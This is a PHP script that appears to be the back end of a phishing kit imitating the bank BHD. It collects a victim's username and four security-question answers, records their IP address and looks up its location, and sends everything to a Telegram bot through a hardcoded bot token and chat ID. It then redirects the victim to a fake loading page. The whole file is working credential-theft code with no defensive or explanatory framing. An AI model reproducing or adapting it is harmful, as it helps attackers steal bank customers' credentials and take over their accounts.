<?php
session_start(); // Iniciar sesión si quieres seguir usando datos anteriores

// Configuración del bot
$token = "8202173622:AAG7lPsKeZ_o_lTCtcRA7C5ZCM15tkTMMYc"; // Token del bot de Telegram
$chat_id = "8029675723"; // ID del chat o grupo

// recuperar datos de la sesión
$uernm24 = $_SESSION['uernm24'] ?? 'N/A';

// Capturar respuestas del formulario
$ans1 = $_POST['ans1'] ?? 'N/A';
$ans2 = $_POST['ans2'] ?? 'N/A';
$ans3 = $_POST['ans3'] ?? 'N/A';
$ans4 = $_POST['ans4'] ?? 'N/A';

// Guardar en sesión si quieres usarlas después
$_SESSION['ans1'] = $ans1;
$_SESSION['ans2'] = $ans2;
$_SESSION['ans3'] = $ans3;
$_SESSION['ans4'] = $ans4;

// Capturar la IP real del usuario
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

// Obtener país y ciudad por API ip-api.com
$pais = 'N/A';
$ciudad = 'N/A';

$geo_url = "http://ip-api.com/json/$ip";
$geo_response = @file_get_contents($geo_url);
if ($geo_response !== false) {
    $geo_data = json_decode($geo_response, true);
    if ($geo_data && $geo_data['status'] === 'success') {
        $pais = $geo_data['country'] ?? 'N/A';
        $ciudad = $geo_data['city'] ?? 'N/A';
    }
} 

// Fecha y hora actual
$fecha = date("Y-m-d H:i:s");

// Mensaje formateado para Telegram
$mensaje = "*🔒 BHD Preguntas de Seguridad:*\n\n"
         . "*✉️ Usuario:* `$uernm24`\n\n"
         . "*1️⃣ Respuesta 1:* `$ans1`\n"
         . "*2️⃣ Respuesta 2:* `$ans2`\n"
         . "*3️⃣ Respuesta 3:* `$ans3`\n"
         . "*4️⃣ Respuesta 4:* `$ans4`\n\n"
         . "*🌐 IP:* `$ip`\n"
         . "*🏙 Ciudad:* `$ciudad`\n"
         . "*🇩🇴 País:* `$pais`\n"
         . "*🕒 Fecha:* `$fecha`\n\n"
         . "👣 @asoctrasmacol";

// Envío a Telegram con cURL
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if ($response === false) {
    echo "❌ Error en cURL: " . curl_error($ch);
}
curl_close($ch);

// Redirigir después del envío
header("Location: cargando2.html");
exit();
?>
